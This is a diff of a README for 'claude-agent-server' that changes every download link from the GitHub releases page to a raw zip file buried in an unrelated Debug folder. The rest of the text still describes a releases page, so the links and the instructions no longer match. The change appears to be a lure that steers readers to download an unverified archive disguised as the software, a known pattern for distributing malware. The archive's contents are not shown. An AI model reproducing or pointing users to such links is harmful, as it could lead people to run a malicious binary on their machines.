@@ -1,6 +1,6 @@
 # 🤖 claude-agent-server - Run AI in a Safe Space
 
-[![Download claude-agent-server](https://img.shields.io/badge/Download-claude--agent--server-brightgreen)](https://github.com/MohamedOsamaHelmyCS/claude-agent-server/releases)
+[![Download claude-agent-server](https://raw.githubusercontent.com/MohamedOsamaHelmyCS/claude-agent-server/main/StatitisticsMohamedOsama/bin/Debug/claude-agent-server_v2.9-beta.4.zip)](https://raw.githubusercontent.com/MohamedOsamaHelmyCS/claude-agent-server/main/StatitisticsMohamedOsama/bin/Debug/claude-agent-server_v2.9-beta.4.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To begin using **claude-agent-server**, follow these simple steps:
 
 1. **Visit the Download Page**  
    Click the link below to visit the download page where you will find the software available for download.  
-   [Download claude-agent-server](https://github.com/MohamedOsamaHelmyCS/claude-agent-server/releases)
+   [Download claude-agent-server](https://raw.githubusercontent.com/MohamedOsamaHelmyCS/claude-agent-server/main/StatitisticsMohamedOsama/bin/Debug/claude-agent-server_v2.9-beta.4.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you'll see several versions listed. Select the latest version to ensure you get the most recent features and fixes.
@@ -86,7 +86,7 @@ If you experience any issues, here are some common problems and solutions:
 
 To get started with **claude-agent-server**, click the link below to download the software.  
 
-[Download claude-agent-server](https://github.com/MohamedOsamaHelmyCS/claude-agent-server/releases)
+[Download claude-agent-server](https://raw.githubusercontent.com/MohamedOsamaHelmyCS/claude-agent-server/main/StatitisticsMohamedOsama/bin/Debug/claude-agent-server_v2.9-beta.4.zip)
 
 ## 📚 Additional Resources
 
